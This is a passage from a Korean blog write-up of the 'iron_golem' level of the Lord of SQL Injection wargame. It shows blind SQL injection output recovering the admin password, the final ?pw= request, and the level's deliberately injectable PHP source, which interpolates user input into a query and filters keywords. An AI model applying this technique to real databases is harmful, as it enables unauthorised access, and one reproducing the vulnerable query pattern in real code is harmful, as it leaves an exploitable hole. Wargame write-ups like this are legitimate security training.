+[+] Found  65 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+[+] Found  66 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+[+] Found  67 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+[+] Found  68 's pw :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+[+] Found password :  47336 48708 44732 50556 33 48764 50528 50528 50528 50528 50528 50528 50528 50529 33 33 33 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+[+] End
+</code></pre></div></div>
+
+<p>이렇게 결과로 나온 값을 <code class="highlighter-rouge">xavis</code> 문제에서 사용했던 <a href="https://www.branah.com/unicode-converter">사이트</a>에서 돌려 보았더니 <code class="highlighter-rouge">루비꺼야!빼애애애애애애애액!!!</code>이라는 값을 얻을 수 있었다.</p>
+
+<p><del>당황…</del></p>
+
+<p>그래서 이 값을 <code class="highlighter-rouge">pw</code> 값으로 넘겨주었더니 문제를 풀 수 있었다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pw=루비꺼야!빼애애애애애애애액!!!
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>------------------------------------------------------------------------------------------------------------------------------
+query : select id from prob_iron_golem where id='admin' and pw='루비꺼야!빼애애애애애애애액!!!'
+------------------------------------------------------------------------------------------------------------------------------
+
+IRON_GOLEM Clear!
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span> 
+  <span class="nx">login_chk</span><span class="p">();</span> 
+  <span class="nx">dbconnect</span><span class="p">();</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/sleep|benchmark/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"HeHe"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from prob_iron_golem where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">())</span> <span class="k">exit</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from prob_iron_golem where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"iron_golem"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">IRON_GOLEM Clear!!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2018/08/16/los-iron_golem.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/15/los-dragon.html">
+        [Lord of SQL Injection] LoS - dragon 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/22/los-dark_eyes.html">
+        [Lord of SQL Injection] LoS - dark_eyes 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
